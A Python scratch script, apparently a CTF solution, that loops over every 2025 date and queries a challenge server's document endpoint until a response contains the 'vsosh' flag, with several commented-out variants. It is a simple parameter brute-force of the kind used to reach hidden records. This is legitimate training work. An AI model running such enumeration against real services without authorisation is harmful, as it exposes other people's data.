import requests

for y in range(1, 13):
    for z in range(1, 32):
        # Используем форматирование с ведущими нулями
        my_date =  f"2025-{y:02d}-{z:02d}"
        response = requests.get("http://tasks.ctfd.infosec.moscow:20194/api/doc?date=" + my_date)
        # print(response.content)
        if 'vsosh' in response.text:
            print(f"Найдено! Дата: {response.text}")
            print(response.text)
            break
    else:
        continue  # Продолжаем внешний цикл, если не было break во внутреннем
    break  # Выходим из внешнего цикла, если нашли флаг
'''
for y in range(1,13):
    for z in range(1,32):
        my_date = {"date" : f"2025-{y}-{z}"}
        for key, value in my_date.items():
            print(my_date)
'''
# import requests
# for y in range(1,13):
#     for z in range(1,32):
#         if len(str(z))== 1:
#             my_date = {"date": f"2025-{y}-0{z}"}
#         else:
#             my_date = {"date": f"2025-{y}-{z}"}
#         response = requests.get('http://tasks.ctfd.infosec.moscow:20007/', params = my_date)
#         print(response.text, my_date)
#         if 'vsosh' in response.text.lower():
#             break
# import requests
#
# for month in range(1, 13):
#     for day in range(1, 32):
#         date = f"2025-{month}-{day}"
#         url = "http://tasks.ctfd.infosec.moscow:20007/" + date
#
#         response = requests.get(url)
#         text = response.text
#
#         if "vsosh" in text:
#             print("Found it on:", date)
#             print(text)
#             exit()
import requests

# for month in range(1, 13):
#     for day in range(1, 32):
#         date = f"2025-{month:02d}-{day:02d}"
#         url = "http://tasks.ctfd.infosec.moscow:20114/" + date
#
#         print(f"Trying {date}")
#         response = requests.get(url)
#         text = response.text
#         print(f"Got {text}")
#
#         if "vsosh" in text:
#             print("Found it on:", date)
#             print(text)
#             exit()
# #
# import requests
#
# for month in range(1, 13):
#     for day in range(1, 32):
#         date = f"2025-{month:02d}-{day:02d}"
#         url = "http://tasks.ctfd.infosec.moscow:20194/api/doc?date=" + date
#
#         print(f"Trying {date}")
#         response = requests.get(url)
#         text = response.text
#         print(f"Got {text}")
#
#         if "vsosh" in text:
#             print("Found it on:", date)
#             print(text)
#             exit()